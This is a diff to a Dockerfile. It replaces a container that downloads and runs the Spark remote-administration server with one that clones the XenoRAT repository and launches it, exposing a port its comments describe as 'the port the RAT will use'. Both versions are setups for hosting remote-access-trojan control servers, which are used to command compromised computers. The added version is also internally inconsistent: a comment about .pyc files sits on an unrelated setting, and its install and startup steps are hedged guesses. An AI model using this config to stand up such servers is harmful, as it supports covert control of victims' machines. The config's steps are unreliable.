@@ -1,34 +1,32 @@
-# Use Ubuntu as the base image
-FROM ubuntu:20.04
+# Use a Python 3.8 slim image
+FROM python:3.8-slim
 
-# Set environment variables to avoid interactive prompts during installation
-ENV DEBIAN_FRONTEND=noninteractive
+# Set environment variable to prevent Python from writing .pyc files
+ENV PYTHONUNBUFFERED 1
 
-# Update package lists and install dependencies
-RUN apt-get update && apt-get install -y \
-    curl \
-    tar \
-    unzip \
-    bash \
-    && rm -rf /var/lib/apt/lists/*
-
-# Set the working directory
+# Set the working directory inside the container
 WORKDIR /app
 
-# Download the server tarball
-RUN curl -L -o server_linux_arm64.tar.gz https://github.com/XZB-1248/Spark/releases/download/v0.2.1/server_linux_arm64.tar.gz
+# Install system dependencies
+RUN apt-get update && apt-get install -y \
+    git \
+    curl \
+    libssl-dev \
+    libffi-dev \
+    build-essential \
+    && rm -rf /var/lib/apt/lists/*
 
-# Check the file type (optional, for debugging)
-RUN file server_linux_arm64.tar.gz
+# Clone the XenoRAT repository into the container
+RUN git clone https://github.com/moom825/xeno-rat.git /app
 
-# Verify the file size
-RUN ls -lh server_linux_arm64.tar.gz
+# Change working directory to the XenoRAT directory
+WORKDIR /app
 
-# Extract the tarball
-RUN tar -xzvf server_linux_arm64.tar.gz || { echo 'Extraction failed!'; exit 1; }
+# Install the Python dependencies from requirements.txt
+RUN pip install --no-cache-dir -r requirements.txt
 
-# Expose the necessary port (adjust if needed)
+# Expose the port the RAT will use (Change this if the RAT uses a different port)
 EXPOSE 8080
 
-# Run the server
-CMD ["./server"]
+# Run XenoRAT on startup (Make sure to adjust this according to the main script)
+CMD ["python", "main.py"]
